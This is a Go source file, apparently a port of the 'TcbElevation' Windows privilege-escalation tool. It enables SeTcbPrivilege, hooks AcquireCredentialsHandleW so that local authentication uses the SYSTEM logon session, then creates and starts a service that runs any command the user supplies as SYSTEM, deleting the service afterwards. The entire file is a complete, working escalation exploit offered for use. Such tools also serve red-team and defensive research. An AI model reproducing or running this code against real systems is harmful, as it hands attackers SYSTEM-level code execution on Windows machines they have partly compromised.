// TcbElevation - Original authors: @splinter_code and @decoder_it
// https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178

package main

import (
	"errors"
	"fmt"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	PRIVILEGE_SET_ALL_NECESSARY = 1
	SERVICE_NAME                = "AAATcb"
	SERVICE_COMMAND             = ""
	SYSTEM_LUID_LOW_PART        = 0x3E7
)

var (
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	secur32  = windows.NewLazySystemDLL("secur32.dll")

	lookupPrivilegeValue      = advapi32.NewProc("LookupPrivilegeValueW")
	privilegeCheck            = advapi32.NewProc("PrivilegeCheck")
	initSecurityInterfaceW    = secur32.NewProc("InitSecurityInterfaceW")
	acquireCredentialsHandleW = secur32.NewProc("AcquireCredentialsHandleW")
)

// https://github.com/microsoft/go-mssqldb/blob/d3c6336130a77a3d167e7d163ac9d036402087b0/integratedauth/winsspi/winsspi.go#L50
type SecurityFunctionTable struct {
	dwVersion                  uint32
	EnumerateSecurityPackages  uintptr
	QueryCredentialsAttributes uintptr
	AcquireCredentialsHandle   uintptr
	FreeCredentialsHandle      uintptr
	Reserved2                  uintptr
	InitializeSecurityContext  uintptr
	AcceptSecurityContext      uintptr
	CompleteAuthToken          uintptr
	DeleteSecurityContext      uintptr
	ApplyControlToken          uintptr
	QueryContextAttributes     uintptr
	ImpersonateSecurityContext uintptr
	RevertSecurityContext      uintptr
	MakeSignature              uintptr
	VerifySignature            uintptr
	FreeContextBuffer          uintptr
	QuerySecurityPackageInfo   uintptr
	Reserved3                  uintptr
	Reserved4                  uintptr
	Reserved5                  uintptr
	Reserved6                  uintptr
	Reserved7                  uintptr
	Reserved8                  uintptr
	QuerySecurityContextToken  uintptr
	EncryptMessage             uintptr
	DecryptMessage             uintptr
}

type PrivilegeSet struct {
	PrivilegeCount uint32
	Control        uint32
	Privilege      [1]windows.LUIDAndAttributes
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: .\\tcb.exe <command>")
		return
	}

	serviceName := SERVICE_NAME
	command := SERVICE_COMMAND
	if command == "" {
		command = os.Args[1]
	}

	err := enableTcbPrivilege()
	if err != nil {
		fmt.Printf("[x] Failed to enable TCB privilege: %v.\n", err)
		return
	}
	fmt.Println("[+] SeTcbPrivilege enabled")

	err = hookAcquireCredentials()
	if err != nil {
		fmt.Printf("[x] Failed to hook AcquireCredentialsHandleW: %v.\n", err)
		return
	}
	fmt.Println("[+] AcquireCredentialsHandleW hooked")

	serviceManagerHandle, err := windows.OpenSCManager(windows.StringToUTF16Ptr("127.0.0.1"), nil, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		fmt.Printf("[x] Failed to connect to service control manager: %v.\n", err)
		return
	}
	defer windows.CloseServiceHandle(serviceManagerHandle)
	fmt.Println("[+] Connected to service control manager")

	if command == "clean" {
		serviceHandle, err := windows.OpenService(serviceManagerHandle, windows.StringToUTF16Ptr(serviceName), windows.SERVICE_ALL_ACCESS)
		if err != nil {
			fmt.Printf("[x] Failed to open existing service '%s': %v.\n", serviceName, err)
			return
		}
		err = deleteService(serviceHandle)
		if err != nil {
			fmt.Printf("[x] Failed to delete existing service '%s': %v.\n", serviceName, err)
			return
		}
		fmt.Printf("[+] Deleted existing service '%s'.\n", serviceName)
		return
	}

	serviceHandle, err := windows.CreateService(serviceManagerHandle, windows.StringToUTF16Ptr(serviceName), windows.StringToUTF16Ptr(serviceName), windows.SERVICE_ALL_ACCESS, windows.SERVICE_WIN32_OWN_PROCESS, windows.SERVICE_DEMAND_START, windows.SERVICE_ERROR_IGNORE, windows.StringToUTF16Ptr(command), nil, nil, nil, nil, nil)
	if err != nil {
		fmt.Printf("[x] Failed to create service '%s': %v.\n", serviceName, err)
		return
	}
	// Delete the service on exit
	defer cleanupService(serviceHandle)
	fmt.Printf("[+] Created service '%s' with command '%s'.\n", serviceName, command)

	err = windows.StartService(serviceHandle, 0, nil)
	if err != nil {
		if err == windows.ERROR_SERVICE_REQUEST_TIMEOUT {
			fmt.Printf("[!] StartService returned an error, but the command should have been executed. Check it yourself! Error: %v.\n", err)
			return
		}
		fmt.Printf("[x] Failed to start service '%s': %v.\n", serviceName, err)
		return
	}
	fmt.Printf("[+] Started service '%s'", serviceName)
}

func enableTcbPrivilege() error {
	token, err := openCurrentProcessToken()
	if err != nil {
		return fmt.Errorf("failed to open current process token: %v", err)
	}
	defer token.Close()

	luid, err := setPrivilege(token, "SeTcbPrivilege")
	if err != nil {
		return fmt.Errorf("failed to set SeTcbPrivilege: %v", err)
	}

	err = checkPrivilege(token, luid)
	if err != nil {
		return fmt.Errorf("PrivilegeCheck failed: %v", err)
	}

	return nil
}

func openCurrentProcessToken() (windows.Token, error) {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ALL_ACCESS, &token)
	if err != nil {
		return 0, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	return token, nil
}

func setPrivilege(token windows.Token, privilegeName string) (windows.LUID, error) {
	var luid windows.LUID
	ret, _, err := lookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(privilegeName))), uintptr(unsafe.Pointer(&luid)))
	if ret == 0 {
		return windows.LUID{}, fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	err = windows.AdjustTokenPrivileges(token, false, &tp, uint32(unsafe.Sizeof(tp)), nil, nil)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("LookupPrivilegeValue failed: %v", err)
	}

	return luid, nil
}

func checkPrivilege(token windows.Token, luid windows.LUID) error {
	privilegeSet := PrivilegeSet{
		PrivilegeCount: 1,
		Control:        PRIVILEGE_SET_ALL_NECESSARY,
		Privilege: [1]windows.LUIDAndAttributes{
			{
				Luid:       luid,
				Attributes: windows.SE_PRIVILEGE_ENABLED,
			},
		},
	}

	var result bool
	ret, _, _ := privilegeCheck.Call(
		uintptr(token),
		uintptr(unsafe.Pointer(&privilegeSet)),
		uintptr(unsafe.Pointer(&result)),
	)
	if ret == 0 || !result {
		return fmt.Errorf("no SeTcbPrivilege in the token. This may indicate that SeTcbPrivilege is not available")
	}

	return nil
}

func hookAcquireCredentials() error {
	ret, _, _ := initSecurityInterfaceW.Call()
	if ret == 0 {
		return errors.New("InitSecurityInterfaceW failed")
	}
	sft := (*SecurityFunctionTable)(unsafe.Pointer(ret))
	if sft == nil {
		return errors.New("failed to parse SecurityFunctionTable structure")
	}
	sft.AcquireCredentialsHandle = windows.NewCallback(AcquireCredentialsHandleWHook)

	return nil
}

func AcquireCredentialsHandleWHook(
	principal *uint16,
	pkg *uint16,
	usage uint32,
	logonId unsafe.Pointer,
	authData unsafe.Pointer,
	getKeyFn uintptr,
	getKeyArg unsafe.Pointer,
	cred uintptr,
	expiry uintptr,
) uintptr {
	luid := windows.LUID{
		LowPart:  SYSTEM_LUID_LOW_PART,
		HighPart: 0,
	}

	ret, _, _ := acquireCredentialsHandleW.Call(
		uintptr(unsafe.Pointer(principal)),
		uintptr(unsafe.Pointer(pkg)),
		uintptr(usage),
		uintptr(unsafe.Pointer(&luid)),
		uintptr(authData),
		getKeyFn,
		uintptr(getKeyArg),
		cred,
		expiry,
	)

	return ret
}

func cleanupService(serviceHandle windows.Handle) {
	if serviceHandle != 0 {
		err := deleteService(serviceHandle)
		if err != nil {
			fmt.Printf("[x] Failed to delete service: %v\n", err)
		} else {
			fmt.Println("[+] Service deleted successfully.")
		}
		windows.CloseServiceHandle(serviceHandle)
	}
}

func deleteService(servicehandler windows.Handle) error {
	if servicehandler == 0 {
		return errors.New("invalid service handle")
	}

	err := windows.DeleteService(servicehandler)
	if err != nil {
		return fmt.Errorf("failed to delete service: %v", err)
	}

	return nil
}
